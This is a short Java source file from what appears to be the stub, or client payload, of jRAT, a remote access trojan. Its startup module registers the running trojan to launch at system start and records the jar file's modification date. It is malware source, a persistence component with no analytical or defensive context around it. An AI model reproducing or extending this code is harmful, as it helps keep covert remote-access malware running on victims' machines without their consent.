package io.jrat.stub.modules.startup;

import io.jrat.common.OperatingSystem;
import io.jrat.stub.Configuration;
import io.jrat.stub.Main;
import io.jrat.stub.Mutex;
import io.jrat.stub.Startup;
import io.jrat.stub.utils.Utils;

import java.io.File;
import java.util.Date;
import java.util.Map;

public class StartupStartupModule extends StartupModule {
	
	public StartupStartupModule(Map<String, String> config) {
		super(config);
	}
	
	public void run() throws Exception {
		String currentJar = Utils.getJarFile().getAbsolutePath();

		try {
			Startup.addToStartup(Configuration.name);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && currentJar.startsWith("/")) {
			currentJar = currentJar.substring(1, currentJar.length());
		}

		File f = new File(currentJar);
		if (f.exists()) {
			Date da = new Date(f.lastModified());
			Configuration.date = da.toString();
		}

	}

}
